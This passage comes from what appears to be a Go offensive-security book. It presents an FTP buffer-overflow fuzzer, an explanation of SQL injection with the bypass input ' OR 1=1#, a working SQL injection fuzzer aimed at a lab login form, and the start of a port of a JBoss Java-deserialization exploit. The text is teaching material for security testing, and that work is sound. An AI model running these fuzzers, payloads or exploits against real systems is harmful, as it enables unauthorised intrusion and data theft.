fmt.Fprint(conn,raw)
bufio.NewReader(conn).ReadString('\n')
iferr:=conn.Close()❼;err!=nil{
❽log.Println("[!]Erroratoffset%d:%s\n",i,err)
}
}
}
Listing9-1:Abufferoverflowfuzzer(/ch-9/ftp-fuzz/main.go)
Thecodeisessentiallyonelargeloop,beginningat❶.
Eachtimetheprogramloops,itaddsanothercharactertothe
usernameyou’llsupply.Inthiscase,you’llsendusernames
from1to2,500charactersinlength.
Foreachiterationoftheloop,youestablishaTCP
connectiontothedestinationFTPserver❷.Anytimeyou
interactwiththeFTPservice,whetherit’stheinitial
connectionorthesubsequentcommands,youexplicitlyread
theresponsefromtheserverasasingleline❹.Thisallows
thecodetoblockwhilewaitingfortheTCPresponsessoyou
don’tsendyourcommandsprematurely,beforepacketshave
madetheirroundtrip.Youthenuseanotherforlooptobuild
thestringofAsinthemannerweshowedpreviously❺.You
usetheindexioftheouterlooptobuildthestringlength
dependentonthecurrentiterationoftheloop,sothatit
increasesbyoneeachtimetheprogramstartsover.Youuse
thisvaluetowritetheUSERcommandbyusingfmt.Fprintf(conn,
raw,user)❻.
AlthoughyoucouldendyourinteractionwiththeFTP
serveratthispoint(afterall,you’refuzzingonlytheUSER
command),youproceedtosendthePASScommandto
completethetransaction.Lastly,youcloseyourconnection
cleanly❼.
It’sworthnotingthattherearetwopoints,❸and❽,
whereabnormalconnectivitybehaviorcouldindicateaservice
disruption,implyingapotentialbufferoverflow:whenthe
connectionisfirstestablishedandwhentheconnectioncloses.
Ifyoucan’testablishaconnectionthenexttimetheprogram
loops,it’slikelythatsomethingwentwrong.You’llthenwant
tocheckwhethertheservicecrashedasaresultofabuffer
overflow.
Ifyoucan’tcloseaconnectionafteryou’veestablishedit,
thismayindicatetheabnormalbehavioroftheremoteFTP
serviceabruptlydisconnecting,butitprobablyisn’tcausedby
abufferoverflow.Theanomalousconditionislogged,butthe
programwillcontinue.
Apacketcapture,illustratedinFigure9-1,showsthateach
subsequentUSERcommandgrowsinlength,confirmingthat
yourcodeworksasdesired.
Figure9-1:AWiresharkcapturedepictingtheUSERcommandgrowingbyone
lettereachtimetheprogramloops
Youcouldimprovethecodeinseveralwaysforflexibility
andconvenience.Forexample,you’dprobablywantto
removethehardcodedIP,port,anditerationvalues,and
insteadincludethemviacommandlineargumentsora
configurationfile.Weinviteyoutoperformtheseusability
updatesasanexercise.Furthermore,youcouldextendthe
codesoitfuzzescommandsafterauthentication.Specifically,
youcouldupdatethetooltofuzztheCWD/CDcommand.
Varioustoolshavehistoricallybeensusceptibletobuffer
overflowsrelatedtothehandlingofthiscommand,makingita
goodtargetforfuzzing.
SQLInjectionFuzzing
SQLInjectionFuzzing
Inthissection,you’llexploreSQLinjectionfuzzing.Instead
ofchangingthelengthofeachinput,thisvariationonthe
attackcyclesthroughadefinedlistofinputstoattemptto
causeSQLinjection.Inotherwords,you’llfuzztheusername
parameterofawebsiteloginformbyattemptingalistof
inputsconsistingofvariousSQLmeta-charactersandsyntax
that,ifhandledinsecurelybythebackenddatabase,willyield
abnormalbehaviorbytheapplication.
Tokeepthingssimple,you’llbeprobingonlyforerror-
basedSQLinjection,ignoringotherforms,suchasboolean-,
time-,andunion-based.Thatmeansthatinsteadoflookingfor
subtledifferencesinresponsecontentorresponsetime,you’ll
lookforanerrormessageintheHTTPresponsetoindicatea
SQLinjection.Thisimpliesthatyouexpectthewebserverto
remainoperational,soyoucannolongerrelyonconnection
establishmentasalitmustestforwhetheryou’vesucceededin
creatingabnormalbehavior.Instead,you’llneedtosearchthe
responsebodyforadatabaseerrormessage.
HowSQLInjectionWorks
Atitscore,SQLinjectionallowsanattackertoinsertSQL
meta-charactersintoastatement,potentiallymanipulatingthe
querytoproduceunintendedbehaviororreturnrestricted,
sensitivedata.Theproblemoccurswhendevelopersblindly
concatenateuntrusteduserdatatotheirSQLqueries,asinthe
followingpseudocode:
username=HTTP_GET["username"]
query="SELECT*FROMusersWHEREuser='"+username+"'"
result=db.execute(query)
if(len(result)>0){
returnAuthenticationSuccess()
returnAuthenticationSuccess()
}else{
returnAuthenticationFailed()
}
Inourpseudocode,theusernamevariableisreaddirectly
fromanHTTPparameter.Thevalueoftheusernamevariable
isn’tsanitizedorvalidated.Youthenbuildaquerystringby
usingthevalue,concatenatingitontotheSQLquerysyntax
directly.Theprogramexecutesthequeryagainstthedatabase
andinspectstheresult.Ifitfindsatleastonematchingrecord,
you’dconsidertheauthenticationsuccessful.Thecodeshould
behaveappropriatelysolongasthesuppliedusername
consistsofalphanumericandacertainsubsetofspecial
characters.Forexample,supplyingausernameofaliceresults
inthefollowingsafequery:
SELECT*FROMusersWHEREuser='alice'
However,whathappenswhentheusersuppliesausername
containinganapostrophe?Supplyingausernameofo'doyle
producesthefollowingquery:
SELECT*FROMusersWHEREuser='o'doyle'
Theproblemhereisthatthebackenddatabasenowseesan
unbalancednumberofsinglequotationmarks.Noticethe
emphasizedportionoftheprecedingquery,doyle;thebackend
databaseinterpretsthisasSQLsyntax,sinceit’soutsidethe
enclosingquotes.This,ofcourse,isinvalidSQLsyntax,and
thebackenddatabasewon’tbeabletoprocessit.Forerror-
basedSQLinjection,thisproducesanerrormessageinthe
HTTPresponse.Themessageitselfwillvarybasedonthe
database.InthecaseofMySQL,you’llreceiveanerror
similartothefollowing,possiblywithadditionaldetails
disclosingthequeryitself:
YouhaveanerrorinyourSQLsyntax
Althoughwewon’tgotoodeeplyintoexploitation,you
couldnowmanipulatetheusernameinputtoproduceavalid
SQLquerythatwouldbypasstheauthenticationinour
example.Theusernameinput'OR1=1#doesjustthatwhen
placedinthefollowingSQLstatement:
SELECT*FROMusersWHEREuser=''OR1=1#'
ThisinputappendsalogicalORontotheendofthequery.
ThisORstatementalwaysevaluatestotrue,because1always
equals1.YouthenuseaMySQLcomment(#)toforcethe
backenddatabasetoignoretheremainderofthequery.This
resultsinavalidSQLstatementthat,assumingoneormore
rowsexistinthedatabase,youcanusetobypass
authenticationintheprecedingpseudocodeexample.
BuildingtheSQLInjectionFuzzer
Theintentofyourfuzzerwon’tbetogenerateasyntactically
validSQLstatement.Quitetheopposite.You’llwanttobreak
thequerysuchthatthemalformedsyntaxyieldsanerrorby
thebackenddatabase,astheO’Doyleexamplejust
demonstrated.Forthis,you’llsendvariousSQLmeta-
charactersasinput.
Thefirstorderofbusinessistoanalyzethetargetrequest.
ByinspectingtheHTMLsourcecode,usinganintercepting
proxy,orcapturingnetworkpacketswithWireshark,you
determinethattheHTTPrequestsubmittedfortheloginportal
resemblesthefollowing:
POST/WebApplication/login.jspHTTP/1.1
Host:10.0.1.20:8080
User-Agent:Mozilla/5.0(X11;Ubuntu;Linuxx86_64;rv:54.0)Gecko/20100101
Firefox/54.0
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language:en-US,en;q=0.5
Accept-Encoding:gzip,deflate
Content-Type:application/x-www-form-urlencoded
Content-Length:35
Referer:http://10.0.1.20:8080/WebApplication/
Cookie:JSESSIONID=2D55A87C06A11AAE732A601FCB9DE571
Connection:keep-alive
Upgrade-Insecure-Requests:1
username=someuser&password=somepass
TheloginformsendsaPOSTrequestto
http://10.0.1.20:8080/WebApplication/login.jsp.Therearetwo
formparameters:usernameandpassword.Forthisexample,we’ll
limitthefuzzingtotheusernamefieldforbrevity.Thecodeitself
isfairlycompact,consistingofafewloops,someregular
expressions,andthecreationofanHTTPrequest.It’sshown
inListing9-2.
funcmain(){
❶payloads:=[]string{
"baseline",
")",
"(",
"\"",
"'",
}
❷sqlErrors:=[]string{
"SQL",
"MySQL",
"ORA-",
"syntax",
}
errRegexes:=[]*regexp.Regexp{}
for_,e:=rangesqlErrors{
❸re:=regexp.MustCompile(fmt.Sprintf(".*%s.*",e))
errRegexes=append(errRegexes,re)
}
❹for_,payload:=rangepayloads{
client:=new(http.Client)
❺body:=[]byte(fmt.Sprintf("username=%s&password=p",payload))
❻req,err:=http.NewRequest(
"POST",
"http://10.0.1.20:8080/WebApplication/login.jsp",
bytes.NewReader(body),
)
iferr!=nil{
log.Fatalf("[!]Unabletogeneraterequest:%s\n",err)
}
req.Header.Add("Content-Type","application/x-www-form-urlencoded")
resp,err:=client.Do(req)
iferr!=nil{
log.Fatalf("[!]Unabletoprocessresponse:%s\n",err)
}
❼body,err=ioutil.ReadAll(resp.Body)
iferr!=nil{
log.Fatalf("[!]Unabletoreadresponsebody:%s\n",err)
}
resp.Body.Close()
❽foridx,re:=rangeerrRegexes{
❾ifre.MatchString(string(body)){
fmt.Printf(
"[+]SQLErrorfound('%s')forpayload:%s\n",
sqlErrors[idx],
payload,
)
break
}
}
}
}
Listing9-2:ASQLinjectionfuzzer(/ch-9/http_fuzz/main.go)
Thecodebeginsbydefiningasliceofpayloadsyouwant
toattempt❶.Thisisyourfuzzinglistthatyou’llsupplylater
asthevalueoftheusernamerequestparameter.Inthesamevein,
youdefineasliceofstringsthatrepresentkeywordswithinan
SQLerrormessage❷.Thesewillbethevaluesyou’llsearch
forintheHTTPresponsebody.Thepresenceofanyofthese
valuesisastrongindicatorthatanSQLerrormessageis
present.Youcouldexpandonbothoftheselists,butthey’re
adequatedatasetsforthisexample.
Next,youperformsomepreprocessingwork.Foreachof
theerrorkeywordsyouwishtosearchfor,youbuildand
compilearegularexpression❸.Youdothisworkoutside
yourmainHTTPlogicsoyoudon’thavetocreateand
compiletheseregularexpressionsmultipletimes,oncefor
eachpayload.Aminoroptimization,nodoubt,butgood
practicenonetheless.You’llusethesecompiledregular
expressionstopopulateaseparatesliceforuselater.
Nextcomesthecorelogicofthefuzzer.Youloopthrough
eachofthepayloads❹,usingeachtobuildanappropriate
HTTPrequestbodywhoseusernamevalueisyourcurrent
payload❺.YouusetheresultingvaluetobuildanHTTP
POSTrequest❻,targetingyourloginform.Youthensetthe
Content-Typeheaderandsendtherequestbycallingclient.Do(req).
Noticethatyousendtherequestbyusingthelong-form
processofcreatingaclientandanindividualrequestandthen
callingclient.Do().YoucertainlycouldhaveusedGo’s
http.PostForm()functiontoachievethesamebehaviormore
concisely.However,themoreverbosetechniquegivesyou
moregranularcontroloverHTTPheadervalues.Althoughin
thisexampleyou’resettingonlytheContent-Typeheader,it’snot
uncommontosetadditionalheadervalueswhenmaking
HTTPrequests(suchasUser-Agent,Cookie,andothers).You
can’tdothiswithhttp.PostForm(),sogoingthelongroutewill
makeiteasiertoaddanynecessaryHTTPheadersinthe
future,particularlyifyou’reeverinterestedinfuzzingthe
headersthemselves.
Next,youreadtheHTTPresponsebodybyusing
ioutil.ReadAll()❼.Nowthatyouhavethebody,youloopthrough
allofyourprecompiledregularexpressions❽,testingthe
responsebodyforthepresenceofyourSQLerrorkeywords
❾.Ifyougetamatch,youprobablyhaveaSQLinjection
errormessage.Theprogramwilllogdetailsofthepayloadand
errortothescreenandmoveontothenextiterationofthe
loop.
Runyourcodetoconfirmthatitsuccessfullyidentifiesa
SQLinjectionflawinavulnerableloginform.Ifyousupply
theusernamevaluewithasinglequotationmark,you’llgetthe
errorindicatorSQL,asshownhere:
$gorunmain.go
[+]SQLErrorfound('SQL')forpayload:'
Weencourageyoutotrythefollowingexercisestohelp
youbetterunderstandthecode,appreciatethenuancesof
HTTPcommunications,andimproveyourabilitytodetect
SQLinjection:
1. Updatethecodetotestfortime-basedSQLinjection.Todothis,you’llhaveto
sendvariouspayloadsthatintroduceatimedelaywhenthebackendquery
executes.You’llneedtomeasuretheround-triptimeandcompareitagainsta
baselinerequesttodeducewhetherSQLinjectionispresent.
2. Updatethecodetotestforboolean-basedblindSQLinjection.Althoughyoucan
usedifferentindicatorsforthis,asimplewayistocomparetheHTTPresponse
codeagainstabaselineresponse.Adeviationfromthebaselineresponsecode,
particularlyreceivingaresponsecodeof500(internalservererror),maybe
indicativeofSQLinjection.
3. RatherthanrelyingonGo’snet.httppackagetofacilitatecommunications,try
usingthenetpackagetodialarawTCPconnection.Whenusingthenet
package,you’llneedtobeawareoftheContent-LengthHTTPheader,which
representsthelengthofthemessagebody.You’llneedtocalculatethislength
correctlyforeachrequestbecausethebodylengthmaychange.Ifyouusean
invalidlengthvalue,theserverwilllikelyrejecttherequest.
Inthenextsection,we’llshowyouhowtoportexploitsto
Gofromotherlanguages,suchasPythonorC.
PORTINGEXPLOITSTOGO
Forvariousreasons,youmaywanttoportanexistingexploit
toGo.Perhapstheexistingexploitcodeisbroken,incomplete,
orincompatiblewiththesystemorversionyouwishtotarget.
Althoughyoucouldcertainlyextendorupdatethebrokenor
incompletecodeusingthesamelanguagewithwhichitwas
created,Gogivesyoutheluxuryofeasycross-compilation,
consistentsyntaxandindentationrules,andapowerful
standardlibrary.Allofthiswillmakeyourexploitcode
arguablymoreportableandreadablewithoutcompromisingon
features.
Likelythemostchallengingtaskwhenportinganexisting
exploitisdeterminingtheequivalentGolibrariesandfunction
callstoachievethesameleveloffunctionality.Forexample,
addressingendianness,encoding,andencryptionequivalents
maytakeabitofresearch,particularlyforthosewhoaren’t
wellversedinGo.Fortunately,we’veaddressedthe
complexityofnetwork-basedcommunicationsinprevious
chapters.Theimplementationsandnuancesofthisshould,
hopefully,befamiliar.
You’llfindcountlesswaystouseGo’sstandardpackages
forexploitdevelopmentorporting.Whileit’sunrealisticfor
ustocomprehensivelycoverthesepackagesandusecasesina
singlechapter,weencourageyoutoexploreGo’sofficial
documentationathttps://golang.org/pkg/.Thedocumentation
isextensive,withanabundanceofgoodexamplestohelpyou
understandfunctionandpackageusage.Herearejustafewof
thepackagesthatwilllikelybeofgreatestinteresttoyouwhen
workingwithexploitation:
bytesProvideslow-levelbytemanipulation
cryptoImplementsvarioussymmetricandasymmetric
ciphersandmessageauthentication
debugInspectsvariousfiletypemetadataandcontents
encodingEncodesanddecodesdatabyusingvarious
commonformssuchasbinary,Hex,Base64,andmore
ioandbufioReadsandwritesdatafromandtovarious
commoninterfacetypesincludingthefilesystem,standard
output,networkconnections,andmore
netFacilitatesclient-serverinteractionbyusingvarious
protocolssuchasHTTPandSMTP
osExecutesandinteractswiththelocaloperatingsystem
syscallExposesaninterfaceformakinglow-levelsystem
calls
unicodeEncodesanddecodesdatabyusingUTF-16orUTF-
8
unsafeUsefulforavoidingGo’stypesafetycheckswhen
interactingwiththeoperatingsystem
Admittedly,someofthesepackageswillprovetobemore
usefulinlaterchapters,particularlywhenwediscusslow-level
Windowsinteractions,butwe’veincludedthislistforyour
awareness.Ratherthantryingtocoverthesepackagesin
detail,we’llshowyouhowtoportanexistingexploitbyusing
someofthesepackages.
PortinganExploitfromPython
Inthisfirstexample,you’llportanexploitoftheJava
deserializationvulnerabilityreleasedin2015.The
vulnerability,categorizedunderseveralCVEs,affectsthe
deserializationofJavaobjectsincommonapplications,
servers,andlibraries. Thisvulnerabilityisintroducedbya
deserializationlibrarythatdoesn’tvalidateinputpriorto
server-sideexecution(acommoncauseofvulnerabilities).
We’llnarrowourfocustoexploitingJBoss,apopularJava
EnterpriseEditionapplicationserver.At
https://github.com/roo7break/serialator/blob/master/serialator
.py,you’llfindaPythonscriptthatcontainslogictoexploit
thevulnerabilityinmultipleapplications.Listing9-3provides
thelogicyou’llreplicate.
defjboss_attack(HOST,PORT,SSL_On,_cmd):
1
#Thebelowcodeisbasedonthejboss_java_serialize.naslscriptwithinNessus
"""
ThisfunctionsetsuptheattackpayloadforJBoss
"""
body_serObj=hex2raw3("ACED000573720032737--SNIPPEDFOR
BREVITY--017400")❶
cleng=len(_cmd)
body_serObj+=chr(cleng)+_cmd❷
body_serObj+=hex2raw3("740004657865637571--SNIPPEDFORBREVITY-
-7E003A")❸
ifSSL_On:❹